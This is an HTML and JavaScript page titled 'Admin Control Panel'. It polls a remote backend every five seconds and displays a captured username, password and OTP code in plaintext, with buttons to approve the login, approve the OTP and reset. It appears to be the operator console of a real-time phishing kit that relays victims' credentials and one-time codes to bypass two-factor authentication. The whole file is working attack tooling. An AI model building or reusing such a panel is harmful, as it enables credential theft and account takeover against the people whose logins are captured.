<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Admin Control Panel</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      background-color: #fff;
      max-width: 500px;
      padding: 20px;
      margin: 30px auto;
      background: #f7f9fc;
    }
    h1 { text-align: center; color: #0070c9; }
    .info {
      background: white;
      padding: 15px;
      border-radius: 8px;
      box-shadow: 0 0 10px #ddd;
      margin-bottom: 20px;
    }
    button {
      background: #0070c9;
      color: white;
      border: none;
      padding: 12px 18px;
      font-size: 16px;
      border-radius: 6px;
      cursor: pointer;
      margin-right: 10px;
      margin-bottom: 10px;
    }
    button:disabled {
      background: #aaa;
      cursor: not-allowed;
    }
    #status { font-weight: bold; margin-top: 10px; }
  </style>
</head>
<body>

<h1>Admin Control Panel</h1>

<div class="info" id="adminPanel">
  <p><strong>Username:</strong> <span id="username">-</span></p>
  <p><strong>Password:</strong> <span id="password">-</span></p>
  <p><strong>OTP Code:</strong> <span id="otp">-</span></p>
  <p><strong>Status:</strong> <span id="approvalStatus">Waiting for login</span></p>
</div>

<div id="adminButtons">
  <button id="approveLoginBtn" disabled>Approve Login</button>
  <button id="approveOtpBtn" disabled>Approve OTP</button>
  <button id="resetBtn" disabled>Reset Login</button>
</div>

<p id="status"></p>

<script>
  const API_BASE = 'https://my-node-backend-4nfy.onrender.com';

  const usernameSpan = document.getElementById('username');
  const passwordSpan = document.getElementById('password');
  const otpSpan = document.getElementById('otp');
  const approvalStatusSpan = document.getElementById('approvalStatus');

  const approveLoginBtn = document.getElementById('approveLoginBtn');
  const approveOtpBtn = document.getElementById('approveOtpBtn');
  const resetBtn = document.getElementById('resetBtn');
  const statusMsg = document.getElementById('status');

  // If backend basic auth is disabled, we can fetch directly without headers
  async function fetchLoginData() {
    try {
      const res = await fetch(`${API_BASE}/get-login-data`);
      const data = await res.json();
      if (data.loginData) {
        usernameSpan.textContent = data.loginData.username || '-';
        passwordSpan.textContent = data.loginData.password || '-';
        otpSpan.textContent = data.loginData.otp || '-';

        let status = '';
        if (!data.loginData.username) status = 'Waiting for login';
        else if (!data.approved) status = 'Pending Login Approval';
        else if (data.loginData.otp && !data.otpApproved) status = 'OTP Pending Approval';
        else if (data.otpApproved) status = 'OTP Approved';

        approvalStatusSpan.textContent = status;

        approveLoginBtn.disabled = !data.loginData.username || data.approved;
        approveOtpBtn.disabled = !data.loginData.otp || data.otpApproved;
        resetBtn.disabled = false;
      }
    } catch (error) {
      statusMsg.textContent = 'Error fetching login data.';
      console.error(error);
    }
  }

  approveLoginBtn.addEventListener('click', async () => {
    statusMsg.textContent = 'Approving login...';
    try {
      const res = await fetch(`${API_BASE}/approve-login`, { method: 'POST' });
      const data = await res.json();
      statusMsg.textContent = data.message;
      fetchLoginData();
    } catch (error) {
      statusMsg.textContent = 'Error approving login.';
      console.error(error);
    }
  });

  approveOtpBtn.addEventListener('click', async () => {
    statusMsg.textContent = 'Approving OTP...';
    try {
      const res = await fetch(`${API_BASE}/approve-otp`, { method: 'POST' });
      const data = await res.json();
      statusMsg.textContent = data.message;
      fetchLoginData();
    } catch (error) {
      statusMsg.textContent = 'Error approving OTP.';
      console.error(error);
    }
  });

  resetBtn.addEventListener('click', async () => {
    statusMsg.textContent = 'Resetting login data...';
    try {
      const res = await fetch(`${API_BASE}/reset-login`, { method: 'POST' });
      const data = await res.json();
      statusMsg.textContent = data.message;
      fetchLoginData();
    } catch (error) {
      statusMsg.textContent = 'Error resetting login.';
      console.error(error);
    }
  });

  // Auto-load data on page open
  fetchLoginData();
  setInterval(fetchLoginData, 5000);
</script>

</body>
</html>
